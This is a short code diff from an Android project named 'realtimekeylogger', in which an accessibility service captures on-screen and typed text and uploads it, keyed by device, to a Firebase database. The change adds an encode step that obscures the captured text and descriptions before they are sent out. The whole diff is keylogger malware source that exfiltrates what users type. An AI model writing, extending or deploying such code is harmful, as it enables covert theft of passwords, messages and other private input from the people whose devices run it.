@@ -6,6 +6,7 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.widget.Toast
 import com.google.firebase.database.*
+import com.shubhamgupta16.realtimekeylogger.utils.encode
 import com.shubhamgupta16.realtimekeylogger.utils.getDeviceId
 import com.shubhamgupta16.realtimekeylogger.utils.getDeviceName
 
@@ -91,8 +92,8 @@ class StrokeService : AccessibilityService() {
         lastEventText = text ?: ""
         rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(
             mapOf(
-                "text" to text,
-                "desc" to desc,
+                "text" to text.encode(),
+                "desc" to desc.encode(),
                 "event" to event
             )
         )
